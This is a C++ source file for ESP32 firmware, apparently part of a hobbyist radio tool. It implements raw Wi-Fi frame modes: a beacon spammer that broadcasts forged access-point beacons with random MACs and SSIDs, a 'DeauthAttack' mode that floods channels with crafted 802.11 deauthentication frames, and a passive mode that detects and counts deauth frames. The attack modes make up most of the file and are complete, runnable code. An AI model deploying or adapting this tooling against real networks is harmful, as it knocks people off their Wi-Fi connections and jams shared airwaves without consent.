#include "WifiRaw.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_random.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

#include "RadioManager.h"
#include "../hw/Leds.h"

namespace radio {
namespace wifi_raw {

namespace {

Mode          g_mode     = Mode::Off;
TaskHandle_t  g_task     = nullptr;
bool          g_stop     = false;
uint32_t      g_tx       = 0;
uint32_t      g_rx       = 0;
uint32_t      g_deauth   = 0;

// IEEE 802.11 "management" frame type detection.
bool isDeauthOrDisassoc(const uint8_t* frame) {
    uint8_t subtype = (frame[0] >> 4) & 0x0F;
    uint8_t type    = (frame[0] >> 2) & 0x03;
    return (type == 0) && (subtype == 12 /*deauth*/ || subtype == 10 /*disassoc*/);
}

void IRAM_ATTR promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    g_rx++;
    if (isDeauthOrDisassoc(pkt->payload)) g_deauth++;
    // Rate-limited blink on RX. Can't call setPixelColor from ISR context
    // without risking watchdog, but leds::signal just stashes event time
    // in RAM (render happens on UI task), so it's safe.
    static uint32_t lastFlash = 0;
    uint32_t now = millis();
    if (now - lastFlash > 80) {
        leds::signal(leds::Channel::Wifi, leds::Event::Rx);
        lastFlash = now;
    }
}

// Minimal beacon template: 57 bytes with variable SSID. Ported from
// cifertech wifi.cpp BeaconSpammer. Byte 37 is SSID length, 38+ is SSID.
uint8_t BEACON[57] = {
    /* Frame control */   0x80, 0x00,
    /* Duration */        0x00, 0x00,
    /* Dest (broadcast)*/ 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    /* Source */          0x01,0x02,0x03,0x04,0x05,0x06,
    /* BSSID */           0x01,0x02,0x03,0x04,0x05,0x06,
    /* Seq/frag */        0x00, 0x00,
    /* Timestamp */       0,0,0,0,0,0,0,0,
    /* Beacon interval */ 0x64, 0x00,
    /* Capability */      0x01, 0x04,
    /* SSID tag, len */   0x00, 0x10,  // SSID length placeholder
    /* SSID bytes (16) */ 'E','S','P','3','2','D','I','V','_','s','p','a','m','_','A','A',
    /* Supported rates */ 0x01, 0x01, 0x82,
};

uint8_t DEAUTH[26] = {
    /* Frame control (deauth, type=0 subtype=12) */ 0xC0, 0x00,
    /* Duration */                                  0x3A, 0x01,
    /* Dest (broadcast) */                          0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    /* Source */                                    0x01,0x02,0x03,0x04,0x05,0x06,
    /* BSSID */                                     0x01,0x02,0x03,0x04,0x05,0x06,
    /* Seq */                                       0x00, 0x00,
    /* Reason code = 7 (class 3 frame) */           0x07, 0x00,
};

void randomizeMac(uint8_t* out6) {
    esp_fill_random(out6, 6);
    out6[0] &= 0xFE; // unicast
    out6[0] |= 0x02; // locally-administered
}

void taskEntry(void*) {
    while (!g_stop) {
        switch (g_mode) {
            case Mode::BeaconSpam: {
                randomizeMac(BEACON + 10);
                memcpy(BEACON + 16, BEACON + 10, 6);
                for (int i = 0; i < 2; ++i) {
                    BEACON[55 - i] = 'A' + (esp_random() % 26);
                }
                uint8_t ch = 1 + (esp_random() % 11);
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                if (esp_wifi_80211_tx(WIFI_IF_AP, BEACON, sizeof(BEACON), false)
                    == ESP_OK) {
                    g_tx++;
                    static uint32_t last = 0;
                    uint32_t now = millis();
                    if (now - last > 80) {
                        leds::signal(leds::Channel::Wifi, leds::Event::Tx);
                        last = now;
                    }
                }
                vTaskDelay(pdMS_TO_TICKS(2));
                break;
            }
            case Mode::DeauthAttack: {
                randomizeMac(DEAUTH + 10);
                memcpy(DEAUTH + 16, DEAUTH + 10, 6);
                uint8_t ch = 1 + (esp_random() % 11);
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                if (esp_wifi_80211_tx(WIFI_IF_AP, DEAUTH, sizeof(DEAUTH), false)
                    == ESP_OK) {
                    g_tx++;
                }
                vTaskDelay(pdMS_TO_TICKS(4));
                break;
            }
            case Mode::DeauthDetect: {
                // Channel hop every 250 ms so we cover all 11 2.4 GHz channels.
                static uint8_t ch = 1;
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                ch = (ch % 11) + 1;
                vTaskDelay(pdMS_TO_TICKS(250));
                break;
            }
            default:
                vTaskDelay(pdMS_TO_TICKS(100));
                break;
        }
    }
    g_task = nullptr;
    vTaskDelete(nullptr);
}

} // namespace

bool start(Mode m) {
    if (!radio::acquire(radio::Owner::Wifi)) return false;
    stop(); // idempotent; also clears radio ownership
    if (!radio::acquire(radio::Owner::Wifi)) return false;

    wifi_mode_t mode = (m == Mode::DeauthDetect) ? WIFI_MODE_NULL : WIFI_MODE_AP;
    WiFi.mode(mode == WIFI_MODE_AP ? WIFI_AP : WIFI_OFF);
    if (m == Mode::DeauthDetect) {
        esp_wifi_init(nullptr); // default cfg if not already inited
        esp_wifi_set_mode(WIFI_MODE_NULL);
        esp_wifi_start();
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(&promiscuousCb);
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    }

    g_mode = m;
    g_stop = false;
    g_tx = g_rx = g_deauth = 0;
    xTaskCreatePinnedToCore(taskEntry, "wifi_raw", 4096, nullptr,
                            /*prio=*/1, &g_task, /*coreId=*/1);
    return true;
}

void stop() {
    if (g_task) {
        g_stop = true;
        for (int i = 0; i < 30 && g_task; ++i) vTaskDelay(pdMS_TO_TICKS(10));
    }
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    g_mode = Mode::Off;
    radio::release(radio::Owner::Wifi);
}

Mode     currentMode() { return g_mode; }
uint32_t framesTxd()   { return g_tx; }
uint32_t framesRxd()   { return g_rx; }
uint32_t deauthsRxd()  { return g_deauth; }

} // namespace wifi_raw
} // namespace radio
